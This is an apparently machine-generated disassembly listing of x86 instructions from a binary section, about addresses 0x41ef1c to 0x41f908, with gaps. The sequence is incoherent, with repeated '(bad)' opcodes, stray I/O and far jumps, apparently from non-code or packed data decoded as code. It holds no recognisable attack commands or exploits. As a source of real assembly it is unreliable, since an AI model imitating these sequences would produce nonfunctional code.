  41ef1c:	mov    ah,BYTE PTR [ebx-0x1847620b]
  41ef22:	mov    edi,0x9cbdd718
  41ef27:	jl     0x41eefe
  41ef29:	popa   
  41ef2a:	daa    
  41ef2b:	movzx  ecx,BYTE PTR [esi+0x63]
  41ef2f:	pop    edx
  41ef30:	sub    DWORD PTR [edx],esp
  41ef32:	aaa    
  41ef33:	cmp    cl,cl
  41ef35:	xor    bl,BYTE PTR [ebx-0x5cd8d534]
  41ef3b:	push   esp
  41ef3c:	inc    ebp
  41ef3d:	icebp  
  41ef3e:	inc    ebp
  41ef3f:	ror    DWORD PTR [edx-0x72],1
  41ef42:	mov    ebx,0x887b8574
  41ef47:	xchg   edx,eax
  41ef48:	jecxz  0x41ef30
  41ef4a:	jecxz  0x41ef32
  41ef4c:	jge    0x41eed1
  41ef4e:	ret    
  41ef4f:	ret    
  41ef50:	jb     0x41efd0
  41ef52:	lods   al,BYTE PTR ss:[esi]
  41ef54:	out    dx,al
  41ef55:	shr    esp,0xe0
  41ef58:	sbb    BYTE PTR ds:0xfe78f8b2,0xe7
  41ef5f:	dec    eax
  41ef60:	fsubrp st(1),st
  41ef62:	bound  ebp,QWORD PTR [ebx-0x80]
  41ef65:	mov    dl,0x37
  41ef67:	or     ch,ah
  41ef69:	add    BYTE PTR [edi+0x24],0x0
  41ef6d:	or     ebx,esp
  41ef6f:	mov    ebx,gs
  41ef71:	outs   dx,BYTE PTR ds:[esi]
  41ef72:	adc    ah,bh
  41ef74:	cwde   
  41ef75:	and    dh,BYTE PTR [ebp-0x3e753a32]
  41ef7b:	dec    edx
  41ef7c:	sbb    bl,bl
  41ef7e:	jmp    0x92dd4f2b
  41ef83:	mov    BYTE PTR [ebx],dl
  41ef85:	adc    eax,0x1d46f9a
  41ef8a:	cld    
  41ef8b:	sub    bl,BYTE PTR [eax]
  41ef8d:	(bad)
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebx,esp,0xffffff93
  41f002:	push   ebp
  41f003:	mov    ebx,0x14a2a
  41f008:	add    eax,0xec000001
  41f00d:	js     0x41f01e
  41f00f:	enter  0x1c20,0xf2
  41f013:	bound  ebp,QWORD PTR [eax]
  41f015:	gs push ebp
  41f017:	clc    
  41f018:	cmp    ah,BYTE PTR [ecx]
  41f01a:	add    DWORD PTR [eax+0x63],edi
  41f01d:	(bad)  
  41f01e:	retf   
  41f01f:	mov    edx,0xe56a6034
  41f024:	cmp    esi,DWORD PTR [ecx+0x51]
  41f027:	in     eax,dx
  41f028:	test   DWORD PTR [edx],ebx
  41f02a:	mov    esp,DWORD PTR [ecx-0x25]
  41f02d:	push   edx
  41f02e:	xor    al,0xd4
  41f030:	hlt    
  41f031:	fdiv   QWORD PTR [eax]
  41f033:	dec    esi
  41f034:	add    DWORD PTR [eax+0x35a0a48f],esi
  41f03a:	mov    bl,BYTE PTR [eax+0x36]
  41f03d:	adc    bl,cl
  41f03f:	cwde   
  41f040:	into   
  41f041:	dec    esi
  41f042:	jo     0x41f095
  41f044:	add    al,0x21
  41f046:	pop    ecx
  41f047:	push   ds
  41f048:	data16 addr16 ss aam 0x48
  41f04d:	ja     0x41f081
  41f04f:	rcr    bl,0xcb
  41f052:	in     eax,dx
  41f053:	mov    edx,0xc7608256
  41f058:	xchg   ebx,eax
  41f059:	xchg   ebx,esi
  41f05b:	sub    BYTE PTR [edx+0x7a2c31d7],ah
  41f061:	mov    edx,0xfab043c2
  41f067:	rol    DWORD PTR [ebp-0x4b80609d],1
  41f06d:	add    bl,BYTE PTR [edi-0x14c20496]
  41f073:	push   DWORD PTR [edi]
  41f075:	repz mov ah,0xe9
  41f078:	sub    al,0x44
  41f07a:	push   ecx
  41f07b:	inc    esp
  41f07c:	sub    ebx,DWORD PTR [esi]
  41f07e:	add    ah,ch
  41f080:	xlat   BYTE PTR ds:[ebx]
  41f081:	and    eax,0x3357e428
  41f086:	ret    0x2c45
  41f089:	into   
  41f08a:	jg     0x41f08e
  41f08c:	icebp  
  41f08d:	mov    edx,DWORD PTR [esp+eiz*8]
  41f090:	sbb    eax,0x40e6bf84
  41f095:	mov    ch,0xd1
  41f097:	leave  
  41f098:	dec    ebx
  41f099:	jp     0x41f0e6
  41f09b:	ret    
  41f09c:	cli    
  41f09d:	jne    0x41f09f
  41f09f:	test   al,0x1d
  41f0a1:	add    al,BYTE PTR [edx+ebp*2]
  41f0a4:	xchg   edi,eax
  41f0a5:	pop    ds
  41f0a6:	fwait
  41f0a7:	out    0xb6,al
  41f0a9:	sahf   
  41f0aa:	pop    edi
  41f0ab:	inc    ecx
  41f0ac:	adc    BYTE PTR [edx-0x3aefc026],0x2a
  41f0b3:	aam    0xfa
  41f0b5:	repz retf 
  41f0b7:	cli    
  41f0b8:	scas   al,BYTE PTR es:[edi]
  41f0b9:	pushf  
  41f0ba:	mov    ebx,0x39496524
  41f0bf:	sbb    eax,ebx
  41f0c1:	aam    0x75
  41f0c3:	jle    0x41f086
  41f0c5:	mov    dl,0xd3
  41f0c7:	xor    al,0x81
  41f0c9:	aas    
  41f0ca:	call   0x7bac3703
  41f0cf:	mov    es,edi
  41f0d1:	mov    edi,ecx
  41f0d3:	sub    eax,0x771c9f6e
  41f0d8:	sbb    DWORD PTR [esi],0x10
  41f0db:	jne    0x41f10d
  41f0dd:	pop    ds
  41f0de:	push   edi
  41f0df:	inc    eax
  41f0e0:	ds je  0x41f108
  41f0e3:	pop    esi
  41f0e4:	jecxz  0x41f0a3
  41f0e6:	mov    edx,0x3dd64d0b
  41f0eb:	add    al,0x29
  41f0ed:	sub    al,0x22
  41f0ef:	addr16 sub esi,0x54
  41f0f3:	lods   eax,DWORD PTR ds:[esi]
  41f0f4:	imul   ecx,DWORD PTR [ebp+0x24],0x18
  41f0f8:	dec    ebp
  41f0f9:	cmp    eax,0xa268637e
  41f0fe:	mov    edx,0xc8c746ed
  41f103:	push   edi
  41f104:	stc    
  41f105:	dec    ebp
  41f106:	sbb    esp,DWORD PTR [eax-0x7b]
  41f109:	jns    0x41f0b5
  41f10b:	aaa    
  41f10c:	pop    ebp
  41f10d:	(bad)  
  41f10e:	push   0x38
  41f110:	jg     0x41f112
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x2766c786
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xfd000001
  41f18d:	jne    0x41f1f2
  41f18f:	sub    al,BYTE PTR [ebx]
  41f191:	icebp  
  41f192:	push   ss
  41f193:	push   ebp
  41f194:	fs cwde 
  41f196:	rol    BYTE PTR [ebx+ebp*4],cl
  41f199:	das    
  41f19a:	stos   BYTE PTR es:[edi],al
  41f19b:	mov    ebx,esp
  41f19d:	idiv   DWORD PTR [edi]
  41f19f:	or     DWORD PTR [edx+eax*4+0x3d],eax
  41f1a3:	xor    ebx,DWORD PTR [ebx-0x54f6c601]
  41f1a9:	dec    eax
  41f1aa:	or     eax,DWORD PTR [esi-0x56]
  41f1ad:	dec    edx
  41f1ae:	push   ebp
  41f1af:	retf   0xc1d8
  41f1b2:	jmp    0x6df9:0xd48df1ee
  41f1b9:	outs   dx,DWORD PTR ds:[esi]
  41f1ba:	xchg   ebx,ecx
  41f1bc:	sub    eax,0xa6a6944d
  41f1c1:	les    edi,FWORD PTR [ebp-0x63]
  41f1c4:	add    al,0x36
  41f1c6:	call   0x16e09fad
  41f1cb:	dec    ebx
  41f1cc:	aas    
  41f1cd:	cmp    dh,cl
  41f1cf:	mov    eax,ds:0x7965b4dc
  41f1d4:	cmp    BYTE PTR [ebx+eax*1],bh
  41f1d7:	add    al,0xdd
  41f1d9:	pop    esp
  41f1da:	shl    DWORD PTR [eax-0x39493bf1],0x41
  41f1e1:	cmc    
  41f1e2:	mov    cl,0xdc
  41f1e4:	lahf   
  41f1e5:	sub    cl,0xf0
  41f1e8:	scas   eax,DWORD PTR es:[edi]
  41f1e9:	mov    eax,0x7a798b62
  41f1ee:	or     ebp,DWORD PTR [esp+esi*8]
  41f1f1:	pop    edi
  41f1f2:	repnz mov cl,0x40
  41f1f5:	cmc    
  41f1f6:	mov    ah,0xa
  41f1f8:	outs   dx,BYTE PTR ds:[esi]
  41f1f9:	ins    BYTE PTR es:[edi],dx
  41f1fa:	or     BYTE PTR [eax-0x31],al
  41f1fd:	adc    DWORD PTR [eax+0x18],ebx
  41f200:	adc    al,0x68
  41f202:	inc    ecx
  41f203:	call   FWORD PTR [ebx+0x1d]
  41f206:	pop    esi
  41f207:	mov    ss,WORD PTR [ebp+0x6843f318]
  41f20d:	xchg   ebx,eax
  41f20e:	push   ss
  41f20f:	push   cs
  41f210:	mov    ds:0x88498fd4,eax
  41f215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f216:	add    esp,DWORD PTR [eax]
  41f218:	xchg   edi,eax
  41f219:	in     al,0x7
  41f21b:	sahf   
  41f21c:	outs   dx,DWORD PTR ds:[esi]
  41f21d:	lahf   
  41f21e:	mov    bh,0x9
  41f220:	ja     0x41f20b
  41f222:	and    eax,0x4eab39d2
  41f227:	sbb    BYTE PTR [esi+0x14f1fd17],bh
  41f22d:	idiv   BYTE PTR [edx]
  41f22f:	dec    di
  41f231:	jmp    0xb669da28
  41f236:	cmp    ebx,DWORD PTR ss:[edi-0x6e]
  41f23a:	js     0x41f254
  41f23c:	sti    
  41f23d:	int    0x5e
  41f23f:	dec    ecx
  41f240:	mov    eax,ds:0x373af16b
  41f245:	xchg   esp,eax
  41f246:	and    BYTE PTR [ebx-0x6e4cfada],ah
  41f24c:	xchg   ebx,eax
  41f24d:	popf   
  41f24e:	out    dx,eax
  41f24f:	ret    0x4357
  41f252:	xchg   esi,eax
  41f253:	mov    ebx,0xad3db89a
  41f258:	xlat   BYTE PTR ds:[ebx]
  41f259:	retf   
  41f25a:	sbb    eax,0x258b376
  41f25f:	mov    eax,0x206a640f
  41f264:	xchg   esp,eax
  41f265:	dec    esi
  41f266:	pop    ecx
  41f267:	fisubr WORD PTR [eax+0x79]
  41f26a:	jge    0x41f21f
  41f26c:	and    bh,BYTE PTR [ecx+0xa60fd9d]
  41f272:	jmp    DWORD PTR [eax]
  41f274:	pop    edx
  41f275:	in     al,dx
  41f276:	mov    ds:0x2e607329,al
  41f27b:	cli    
  41f27c:	mov    BYTE PTR [ebx],ah
  41f27e:	xlat   BYTE PTR ds:[ebx]
  41f27f:	sbb    al,0xc9
  41f281:	shr    bl,cl
  41f283:	cmp    eax,0x3b736c6c
  41f288:	dec    ebx
  41f289:	add    dl,BYTE PTR [eax-0x38]
  41f28c:	inc    ecx
  41f28d:	lea    edx,ds:0x2ef7
	...
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f37f
  41f301:	push   es
  41f302:	xor    eax,0x14c34e2
  41f307:	add    BYTE PTR ds:0x8000001,al
  41f30d:	jo     0x41f2f7
  41f30f:	inc    edx
  41f310:	adc    eax,0x41e6003
  41f315:	cmp    ebp,DWORD PTR [ebp+0x0]
  41f318:	lods   eax,DWORD PTR ds:[esi]
  41f319:	jae    0x41f329
  41f31b:	rcl    bh,1
  41f31d:	cmp    ax,0xdfab
  41f321:	dec    ebp
  41f322:	push   ebx
  41f323:	fs stos DWORD PTR es:[edi],eax
  41f325:	mov    bl,0xae
  41f327:	in     eax,0x30
  41f329:	std    
  41f32a:	ficomp WORD PTR [eax+0x4c54059c]
  41f330:	icebp  
  41f331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f332:	cwde   
  41f333:	dec    esp
  41f334:	loope  0x41f300
  41f336:	xchg   edx,eax
  41f337:	outs   dx,BYTE PTR ds:[esi]
  41f338:	daa    
  41f339:	mov    DWORD PTR [eax-0x74e16f6e],edx
  41f33f:	sbb    dh,BYTE PTR [eax]
  41f341:	fs lock addr16 ja 0x41f3a9
  41f346:	mov    edx,0xbcc4b948
  41f34b:	mov    dl,0xed
  41f34d:	inc    ebp
  41f34e:	es sub esi,ecx
  41f351:	lds    esi,FWORD PTR [ecx]
  41f353:	xor    DWORD PTR [eax-0x39101e9a],ebp
  41f359:	lods   eax,DWORD PTR ds:[esi]
  41f35a:	ds int 0xfd
  41f35d:	cmc    
  41f35e:	mov    WORD PTR [edi+0x1b],?
  41f361:	mov    edx,0x63669824
  41f366:	push   eax
  41f367:	icebp  
  41f368:	aad    0x2d
  41f36a:	ret    
  41f36b:	mov    bl,0x8b
  41f36d:	ficomp DWORD PTR [esi-0x3f]
  41f370:	and    esi,DWORD PTR [edx]
  41f372:	out    dx,al
  41f373:	fnsave [edx]
  41f375:	xchg   edi,eax
  41f376:	nop
  41f377:	shr    BYTE PTR ds:0xebce73dd,cl
  41f37d:	xor    bh,BYTE PTR [edi+ebp*1]
  41f380:	dec    esp
  41f381:	dec    edx
  41f382:	mov    ebx,0x17706ecd
  41f387:	hlt    
  41f388:	inc    ebx
  41f389:	popf   
  41f38a:	xchg   edi,eax
  41f38b:	enter  0x820,0xd5
  41f38f:	mov    bh,0xc5
  41f391:	in     al,dx
  41f392:	not    bh
  41f394:	push   esi
  41f395:	xchg   ebx,eax
  41f396:	call   0x621286fb
  41f39b:	daa    
  41f39c:	stc    
  41f39d:	or     al,0x26
  41f39f:	sahf   
  41f3a0:	xchg   esi,eax
  41f3a1:	popf   
  41f3a2:	ds sbb esi,esi
  41f3a5:	push   ebp
  41f3a6:	xlat   BYTE PTR ds:[ebx]
  41f3a7:	add    BYTE PTR [eax],ah
  41f3a9:	call   0xd9bf89fc
  41f3ae:	arpl   WORD PTR [edx],sp
  41f3b0:	shl    cl,0x8b
  41f3b3:	inc    edx
  41f3b4:	lds    esi,FWORD PTR [edx]
  41f3b6:	iret   
  41f3b7:	inc    ecx
  41f3b8:	jno    0x41f400
  41f3ba:	aad    0x38
  41f3bc:	jmp    0x41f3f3
  41f3be:	xor    DWORD PTR [esi+eiz*8-0x30],0xffffffae
  41f3c3:	cmc    
  41f3c4:	jo     0x41f379
  41f3c6:	stos   BYTE PTR es:[edi],al
  41f3c7:	and    BYTE PTR [eax],0xde
  41f3ca:	jp     0x41f414
  41f3cc:	xchg   BYTE PTR [ecx+0x2],cl
  41f3cf:	gs dec esi
  41f3d1:	xlat   BYTE PTR ds:[ebx]
  41f3d2:	(bad)  
  41f3d3:	push   ecx
  41f3d4:	adc    eax,0x369ddf5
  41f3d9:	mov    bl,0x77
  41f3db:	idiv   DWORD PTR [ebp+0x46092d8f]
  41f3e1:	fldenv [esi]
  41f3e3:	or     edx,DWORD PTR [ecx-0x7c2ef158]
  41f3e9:	repnz push 0x8e4129b7
  41f3ef:	mov    bl,0xc6
  41f3f1:	inc    edx
  41f3f2:	jecxz  0x41f3e4
  41f3f4:	add    ah,dl
  41f3f6:	dec    ecx
  41f3f7:	dec    esp
  41f3f8:	gs in  eax,0x97
  41f3fb:	inc    ebp
  41f3fc:	xchg   esi,eax
  41f3fd:	pop    ss
  41f3fe:	lahf   
  41f3ff:	jmp    0x7389:0x30dfef07
  41f406:	push   edx
  41f407:	mov    esp,DWORD PTR [edx+0x7c]
  41f40a:	sub    eax,0x401bf689
  41f40f:	jmp    0x41f4fe
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x7
  41f481:	pusha  
  41f482:	xor    bh,BYTE PTR es:[ecx]
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0xfb000001
  41f48d:	xor    BYTE PTR [ebx+0x61],bl
  41f490:	sbb    BYTE PTR gs:[edx-0x33796f07],cl
  41f497:	mov    al,ds:0x420d719
  41f49c:	cld    
  41f49d:	lods   al,BYTE PTR ds:[esi]
  41f49e:	push   esi
  41f49f:	mov    WORD PTR [edi-0x6b],?
  41f4a2:	(bad)  
  41f4a3:	mov    al,ds:0x88baa489
  41f4a8:	sbb    al,BYTE PTR [edi]
  41f4aa:	scas   eax,DWORD PTR es:[edi]
  41f4ab:	jns    0x41f50c
  41f4ad:	jb     0x41f4d5
  41f4af:	mov    al,0x63
  41f4b1:	cmp    dl,dl
  41f4b3:	ror    BYTE PTR es:[edx+0x312248a0],1
  41f4ba:	std    
  41f4bb:	ins    DWORD PTR es:[edi],dx
  41f4bc:	sbb    edi,ebx
  41f4be:	xchg   esi,eax
  41f4bf:	clc    
  41f4c0:	aam    0x79
  41f4c2:	ret    
  41f4c3:	jb     0x41f4bf
  41f4c5:	mov    eax,ds:0x77059035
  41f4ca:	test   eax,0xbbc0b54c
  41f4cf:	sahf   
  41f4d0:	cmp    al,0xd5
  41f4d2:	xchg   esi,eax
  41f4d3:	sub    eax,0xdb7be30b
  41f4d8:	xchg   esp,eax
  41f4d9:	adc    DWORD PTR [ecx+edi*1],esi
  41f4dc:	fist   DWORD PTR [esi-0x69b1d2fc]
  41f4e2:	xchg   ebp,eax
  41f4e3:	test   cl,ah
  41f4e5:	jae    0x41f539
  41f4e7:	mov    al,ah
  41f4e9:	outs   dx,BYTE PTR ds:[esi]
  41f4ea:	push   edx
  41f4eb:	(bad)  [ebx+ebp*4]
  41f4ee:	sbb    edx,ecx
  41f4f0:	(bad)  
  41f4f2:	jecxz  0x41f474
  41f4f4:	dec    ecx
  41f4f5:	pop    esp
  41f4f6:	cs or  ebx,ebx
  41f4f9:	sbb    DWORD PTR [ecx+eax*4],edx
  41f4fc:	jp     0x41f513
  41f4fe:	push   ds
  41f4ff:	adc    DWORD PTR [ebx+0x19d1f733],esp
  41f505:	fsub   DWORD PTR [ecx+0x7]
  41f508:	xchg   esp,eax
  41f509:	inc    ebp
  41f50a:	stos   DWORD PTR es:[edi],eax
  41f50b:	push   ss
  41f50c:	sbb    BYTE PTR [esi],bh
  41f50e:	pop    ds
  41f50f:	retf   0x7853
  41f512:	push   esi
  41f513:	sub    eax,0x5fbe24d6
  41f518:	push   edi
  41f519:	add    al,BYTE PTR [esi+eax*4+0x3205da8b]
  41f520:	jnp    0x41f4f8
  41f522:	aam    0x72
  41f524:	cs xchg esp,eax
  41f526:	fs loope 0x41f553
  41f529:	rol    BYTE PTR [ebp-0x14],1
  41f52c:	ffreep st(4)
  41f52e:	or     al,0x88
  41f530:	stc    
  41f531:	cmp    BYTE PTR [edi],bl
  41f533:	cmp    ch,BYTE PTR [esi]
  41f535:	into   
  41f536:	jae    0x41f594
  41f538:	inc    ebx
  41f539:	(bad)  
  41f53a:	sbb    al,0x91
  41f53c:	xlat   BYTE PTR ds:[ebx]
  41f53d:	aad    0x4d
  41f53f:	outs   dx,BYTE PTR ds:[esi]
  41f540:	test   BYTE PTR [edx+0x7],0xe5
  41f544:	cli    
  41f545:	cmp    DWORD PTR [edi+0xd5606f5],esp
  41f54b:	sbb    edi,ebx
  41f54d:	(bad)  
  41f54f:	les    ebx,FWORD PTR [eax]
  41f551:	retf   
  41f552:	cmc    
  41f553:	div    ecx
  41f555:	push   ebx
  41f556:	xchg   ebx,eax
  41f557:	xor    eax,DWORD PTR [ebp-0x2537059f]
  41f55d:	(bad)  
  41f55e:	in     eax,dx
  41f55f:	inc    ebx
  41f560:	jo     0x41f5b1
  41f562:	pop    ebp
  41f563:	popf   
  41f564:	pop    esi
  41f565:	push   eax
  41f566:	or     BYTE PTR [ebp+0x739a2de0],dl
  41f56c:	ja     0x41f59d
  41f56e:	jne    0x41f5eb
  41f570:	lock xchg ebx,eax
  41f572:	ds mov ebx,0xda90aaaa
  41f578:	daa    
  41f579:	push   esp
  41f57a:	fidiv  WORD PTR [edx]
  41f57c:	shr    dl,cl
  41f57e:	xor    ecx,DWORD PTR [edx-0x38d4756f]
  41f584:	mov    ch,0xf3
  41f586:	mov    ah,0xc0
  41f588:	mov    ecx,0x33104319
  41f58d:	mov    ebp,0xd796c7
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x9cd8:0x368cd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0xcb000001
  41f60d:	ja     0x41f5a9
  41f60f:	jae    0x41f5a4
  41f611:	mov    ah,BYTE PTR [ebx]
  41f613:	mov    ebp,0x1ce2baa8
  41f618:	cwde   
  41f619:	dec    esp
  41f61a:	and    dl,bl
  41f61c:	sbb    eax,0x2a20d2c9
  41f621:	enter  0xf12a,0x8a
  41f625:	inc    ebx
  41f626:	cmp    bl,BYTE PTR ss:[ebp+0x5c]
  41f62a:	fisttp DWORD PTR [esi+0x1e]
  41f62d:	mov    al,ds:0xd060adac
  41f632:	enter  0xe58e,0x9
  41f636:	and    eax,edi
  41f638:	xchg   esi,eax
  41f639:	cmp    BYTE PTR [ebx-0x4b264939],bh
  41f63f:	push   ss
  41f640:	arpl   WORD PTR [eax+0x24],ax
  41f643:	cmp    eax,0x8e785389
  41f648:	test   DWORD PTR [eax+0x2416e31f],edi
  41f64e:	xchg   edi,eax
  41f64f:	les    edx,FWORD PTR [esi+0x244f4690]
  41f655:	and    DWORD PTR [edi],ebp
  41f657:	mov    dh,0x2d
  41f659:	cld    
  41f65a:	call   0xcfb175c7
  41f65f:	pushf  
  41f660:	js     0x41f6cb
  41f662:	adc    al,0x8e
  41f664:	test   al,0xdd
  41f666:	int    0x20
  41f668:	retf   
  41f669:	ret    
  41f66a:	cli    
  41f66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f66c:	nop
  41f66d:	pop    esi
  41f66e:	push   es
  41f66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f670:	outs   dx,DWORD PTR ds:[esi]
  41f671:	call   0xd74a:0x5981a93a
  41f678:	fs add ah,ch
  41f67b:	mov    dl,0x4
  41f67d:	xor    cl,BYTE PTR [ebx+0x73]
  41f680:	and    bh,BYTE PTR [edx-0x9]
  41f683:	inc    esp
  41f684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f685:	pushf  
  41f686:	mov    ds:0xba55c52c,eax
  41f68b:	mov    al,ds:0x3457af10
  41f690:	fld    TBYTE PTR [eax+0x10]
  41f693:	fmul   st,st(5)
  41f695:	clc    
  41f696:	add    DWORD PTR [ebx-0xe],eax
  41f699:	mov    ds,ebx
  41f69b:	int3   
  41f69c:	xor    al,0x4d
  41f69e:	dec    ecx
  41f69f:	add    DWORD PTR [edx-0x57],esi
  41f6a2:	inc    ebx
  41f6a3:	cmp    ebp,ebp
  41f6a5:	sub    al,bl
  41f6a7:	(bad)  
  41f6aa:	xor    BYTE PTR [ebp+0x334c68db],dh
  41f6b0:	mov    ebp,DWORD PTR [ebx]
  41f6b2:	enter  0xa886,0x1e
  41f6b6:	jg     0x41f69e
  41f6b8:	dec    eax
  41f6b9:	mov    bh,0x3
  41f6bb:	leave  
  41f6bc:	(bad)  
  41f6bd:	jle    0x41f683
  41f6bf:	mov    DWORD PTR [esi+ecx*8],ebx
  41f6c2:	loop   0x41f6dd
  41f6c4:	dec    esp
  41f6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c6:	into   
  41f6c7:	xor    al,0xbf
  41f6c9:	xchg   esi,eax
  41f6ca:	mov    ds:0xe185d81d,eax
  41f6cf:	jge    0x41f6ea
  41f6d1:	jge    0x41f6ef
  41f6d3:	push   0x68
  41f6d5:	push   es
  41f6d6:	push   0x741d980c
  41f6db:	int3   
  41f6dc:	mov    al,ds:0x5eacd7f0
  41f6e1:	xchg   ecx,eax
  41f6e2:	mov    esi,0xc476d619
  41f6e7:	inc    edx
  41f6e8:	jmp    0x41f6c1
  41f6ea:	pop    ecx
  41f6eb:	(bad)  
  41f6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ed:	sub    esi,DWORD PTR [edx-0x6647987b]
  41f6f3:	unpckhps xmm7,xmm1
  41f6f6:	pop    eax
  41f6f7:	pop    ebp
  41f6f8:	pop    ecx
  41f6f9:	popf   
  41f6fa:	sahf   
  41f6fb:	mov    WORD PTR [ecx+0x4692aa87],ss
  41f701:	add    BYTE PTR ds:0xb4bae923,dh
  41f707:	lock (bad) 
  41f709:	arpl   WORD PTR [ecx],cx
  41f70b:	xchg   edx,eax
  41f70c:	cmp    esp,DWORD PTR [ebx+0xa]
  41f70f:	sbb    BYTE PTR [esi+0x0],al
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x75e3:0x2c6c62d2
  41f783:	mov    eax,DWORD PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x4a000001
  41f78d:	fstp   TBYTE PTR [ebp-0x6303fe66]
  41f793:	mov    edi,es
  41f795:	sar    BYTE PTR ds:0x5611008a,cl
  41f79b:	cwde   
  41f79c:	ret    
  41f79d:	ret    
  41f79e:	cmp    edi,DWORD PTR [eax]
  41f7a0:	mov    ds:0xc969959f,eax
  41f7a5:	je     0x41f76b
  41f7a7:	and    DWORD PTR [edx+0x646f844e],0xffffff99
  41f7ae:	gs jno 0x41f78c
  41f7b1:	test   BYTE PTR [edi],al
  41f7b3:	inc    esp
  41f7b4:	div    BYTE PTR [ecx-0x10]
  41f7b7:	aad    0x9b
  41f7b9:	pop    ebp
  41f7ba:	add    al,0x0
  41f7bc:	loop   0x41f76d
  41f7be:	cmp    DWORD PTR [ebp+0x31a29c21],esi
  41f7c4:	ror    DWORD PTR [ebp-0x48],1
  41f7c7:	(bad)  
  41f7c8:	leave  
  41f7c9:	mov    edi,0x1fb9c015
  41f7ce:	jmp    0xc773:0xfe39463a
  41f7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d6:	data16 lahf 
  41f7d8:	ins    BYTE PTR es:[edi],dx
  41f7d9:	(bad)  
  41f7da:	cmp    DWORD PTR [edi-0x3a22da6c],eax
  41f7e0:	inc    esp
  41f7e1:	jno    0x41f85a
  41f7e3:	xchg   esp,eax
  41f7e4:	xchg   ebp,eax
  41f7e5:	add    bl,BYTE PTR [ebx-0x1407f575]
  41f7eb:	mov    al,ds:0xa3f5f167
  41f7f0:	outs   dx,DWORD PTR fs:[esi]
  41f7f2:	or     ecx,edx
  41f7f4:	adc    esi,ebx
  41f7f6:	or     esi,DWORD PTR [edx+0x5]
  41f7f9:	sub    DWORD PTR [ecx-0x5f27e8da],ecx
  41f7ff:	cmp    BYTE PTR [edi+0x1a],bh
  41f802:	iret   
  41f803:	popa   
  41f804:	mov    ebp,0x77a57c60
  41f809:	retf   
  41f80a:	push   edx
  41f80b:	sti    
  41f80c:	rcl    BYTE PTR ds:0x561719df,cl
  41f812:	shr    DWORD PTR ds:[ebx],1
  41f815:	call   0xe83fba56
  41f81a:	inc    ebx
  41f81b:	mov    bl,0x43
  41f81d:	jo     0x41f801
  41f81f:	loope  0x41f7e6
  41f821:	xchg   esp,eax
  41f822:	cmp    al,0xb7
  41f824:	dec    ecx
  41f825:	dec    ebx
  41f826:	iret   
  41f827:	int    0xc7
  41f829:	and    eax,0x6b0b6676
  41f82e:	stc    
  41f82f:	cli    
  41f830:	outs   dx,DWORD PTR ds:[esi]
  41f831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f832:	adc    eax,0x9112face
  41f837:	xchg   ebp,eax
  41f838:	inc    esp
  41f839:	clc    
  41f83a:	xor    edi,esp
  41f83c:	sbb    eax,0x169f5aa0
  41f841:	cwde   
  41f842:	stos   BYTE PTR es:[edi],al
  41f843:	and    al,0xbe
  41f845:	mov    al,ds:0xc45f2e74
  41f84a:	repnz and eax,esp
  41f84d:	in     al,0xcb
  41f84f:	pop    esi
  41f850:	dec    eax
  41f851:	dec    edi
  41f852:	das    
  41f853:	sub    eax,0x43c9ddfe
  41f858:	fisub  DWORD PTR [eax-0x20]
  41f85b:	(bad)  
  41f85d:	push   eax
  41f85e:	sti    
  41f85f:	push   0xd8c3dc04
  41f864:	mov    edi,0x82927d38
  41f869:	stos   DWORD PTR es:[edi],eax
  41f86a:	rol    BYTE PTR [esi+0x42],cl
  41f86d:	and    DWORD PTR [ebx+edx*4+0x417bc5ba],edi
  41f874:	pop    ebx
  41f875:	sbb    cl,dl
  41f877:	pop    ecx
  41f878:	jg     0x41f84c
  41f87a:	stos   DWORD PTR es:[edi],eax
  41f87b:	inc    ebx
  41f87c:	cmp    al,0x81
  41f87e:	push   es
  41f87f:	add    ch,BYTE PTR [edi-0x7086ae83]
  41f885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f886:	xchg   ebp,eax
  41f887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f888:	cmp    eax,0x7c240b0
  41f88d:	adc    eax,0x21b7b2
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	(bad)
  41f903:	and    cl,BYTE PTR [eax+0x50]
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xb9000001
